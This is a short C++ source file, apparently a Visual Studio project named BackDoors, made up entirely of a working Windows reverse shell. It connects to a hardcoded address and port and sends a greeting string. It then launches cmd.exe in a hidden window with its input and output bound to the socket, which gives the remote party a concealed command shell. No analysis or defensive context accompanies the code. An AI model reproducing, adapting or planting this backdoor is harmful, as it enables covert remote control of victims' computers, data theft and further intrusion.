// BackDoors.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<stdio.h>
#include<Winsock2.h>
#pragma comment(lib,"ws2_32.lib")

#define REMOTE_ADDR "192.168.1.20"
#define REMOTE_PORT 6666


int _tmain(int argc, _TCHAR* argv[])
{
	SOCKET s;
	WSADATA wsd;
	WSAStartup(0x0202,&wsd);
	s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	SOCKADDR_IN sin;

	sin.sin_addr.S_un.S_addr=inet_addr(REMOTE_ADDR);
	sin.sin_family=AF_INET;
	sin.sin_port=htons(6666);
	
	connect(s,(SOCKADDR *)&sin,sizeof(sin));
	send(s,"HELLO BODY",sizeof("HELLO BODY"),0);

	TCHAR cmdline[255]=L"cmd.exe";
	STARTUPINFO si;
	GetStartupInfo(&si);
	PROCESS_INFORMATION pi;
	si.cb=sizeof(STARTUPINFO);
	si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;
	si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi);

	return 0;
}


